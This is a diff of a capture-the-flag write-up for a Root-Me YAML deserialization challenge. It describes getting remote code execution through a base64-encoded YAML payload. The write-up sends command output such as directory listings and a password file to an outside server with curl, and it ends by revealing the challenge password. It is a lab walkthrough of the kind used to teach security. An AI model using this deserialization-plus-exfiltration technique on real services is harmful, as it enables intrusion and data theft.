@@ -2,17 +2,17 @@
 
 When you open the chall, this is what you will see
 
-![anh1]()
+![anh1](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/YamlDe_1.PNG)
 
 Take a look at the HTTP request which we sent to the server, you will see that there's nothing seems to be injectable. However, if you look at the url, you will notice that the path of it is encoded in base64. The url is `http://challenge01.root-me.org:59071/eWFtbDogV2UgYXJlIGN1cnJlbnRseSBpbml0aWFsaXppbmcgb3VyIG5ldyBzaXRlICEg`. Decode the `eWFtbDogV2UgYXJlIGN1cnJlbnRseSBpbml0aWFsaXppbmcgb3VyIG5ldyBzaXRlICEg` part of the url and this is what you will get: `yaml: We are currently initializing our new site ! `. Try to change the part behind `yaml:` to `Hello world`, then base64 encode it and paste it in the url to check if we can inject the url or not.
 
-![anh2]()
+![anh2](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/YamlDe_2.PNG)
 
 So we know that the url is injectable, it's yaml deserialization attack. Please read [this document](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf?utm_source=dlvr.it&utm_medium=twitter) to understand what yaml deserialization is. From the document, we know that this attack can lead to RCE and we can leverage that RCE to steal the admin password.
 
 Why do we have to use RCE when we can just exploit it directly? Because when you execuse the command with `subprocess`, you will get a line like `<subprocess.Popen object at 0x7fa4b29509a0>` first, follow after that is the result of you command. But the challenge is only return a first line when you executed the code, so we must find another way.
 
-![anh3]()
+![anh3](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/YamlDe_3.PNG)
 
 Thank to this [Python deserialization attack payload generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator), I can write my own code to exploit this chall. This challenge requires the payload to have the `yaml:` part before the payload, so we can't just use the original Github repos above. This is my code to exploit this challenge:
 
@@ -54,14 +54,14 @@ The command I used to exploit is `curl -i -H "Content-Type: text/plain" -X POST 
 
 In linux, you can execute a linux command using `$()`. Using this method, you can send execute the command and send it to a third-party server with `curl`. So if I use `curl -i -H "Content-Type: text/plain" -X POST --data "$(ls -a)" `, I will list all the directories in the server and send it to my server.
 
-![anh4]()
+![anh4](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/YamlDe_4.PNG)
 
 Go to my server to check if anything happened
 
-![anh5]()
+![anh5](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/YamlDe_5.PNG)
 
 Good. Then read the `.password` file and we are done.
 
-![anh6]()
+![anh6](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/Yaml_De6.PNG)
 
 The password is in the body of the request. It is `561385a008727f860eda1afb7f8eba76`.
